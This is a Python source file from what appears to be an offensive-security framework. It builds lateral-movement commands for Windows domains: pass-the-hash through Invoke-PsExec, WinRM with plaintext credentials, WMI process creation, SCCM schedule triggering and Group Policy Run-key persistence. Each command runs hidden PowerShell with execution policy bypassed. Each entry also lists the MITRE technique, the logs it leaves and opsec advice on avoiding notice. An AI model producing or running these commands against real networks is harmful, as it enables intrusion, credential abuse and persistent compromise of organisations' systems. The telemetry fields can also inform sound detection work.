# language: Python 3.11+, file: cf/lateral.py
# *lateral movement — command builders with telemetry/opsec notes*
from __future__ import annotations

from .util import json_dumps

KINDS: dict[str, dict[str, str]] = {
    "pth": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Import-Module .\\Invoke-PsExec.ps1;"
            "Invoke-PsExec \\\\{host} -u {domain}\\{user} -p {password} "
            "-c '{payload}'\""
        ),
        "mitre": "T1550.002",
        "telemetry": "4624 type 3, 5140, 4648",
        "opsec": "pth needs ntlm relay or local admin on an intermediate host",
    },
    "winrm": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "$s=New-PSSession -ComputerName {host} "
            "-Credential (New-Object PSCredential('{domain}\\{user}', "
            "(ConvertTo-SecureString '{password}' -AsPlainText -Force)));"
            "Invoke-Command -Session $s -ScriptBlock {{ {payload} }}\""
        ),
        "mitre": "T1021.006",
        "telemetry": "5985, 4624 type 3, 4103",
        "opsec": "winrm traffic is http — easy to spot on a monitored vlan",
    },
    "wmi": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Invoke-WmiMethod -Class Win32_Process -Name Create "
            "-ArgumentList '{payload}' -ComputerName {host} "
            "-Credential (Get-Credential)\""
        ),
        "mitre": "T1047",
        "telemetry": "4688, 5857, 5858, sysmon:1",
        "opsec": "leaves wmi operation logs on the remote host",
    },
    "sccm": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Invoke-CimMethod -ClassName SMS_Client "
            "-MethodName TriggerSchedule '{schedule_id}' -ComputerName {host}\""
        ),
        "mitre": "T1218",
        "telemetry": "smsprov.log, 4688, 4104",
        "opsec": "sccm abuse is high-signal — pivot only inside the change window",
    },
    "gpo": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Set-GPRegistryValue -Name '{gpo}' -Key "
            "'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
            "-ValueName '{value}' -Value '{payload}' -Type String\""
        ),
        "mitre": "T1484.001",
        "telemetry": "5136, sysmon:13",
        "opsec": "gpo push is loud and persistent — only with an explicit objective",
    },
}


def command(kind: str, host: str, **values: str) -> dict[str, str]:
    spec = KINDS.get(kind)
    if spec is None:
        raise KeyError(f"unknown lateral kind: {kind}")
    out = spec["command"].format(host=host, **values)
    return {
        "kind": kind,
        "command": out,
        "mitre": spec["mitre"],
        "telemetry": spec["telemetry"],
        "opsec": spec["opsec"],
        "json": json_dumps({"kind": kind, "command": out}),
    }
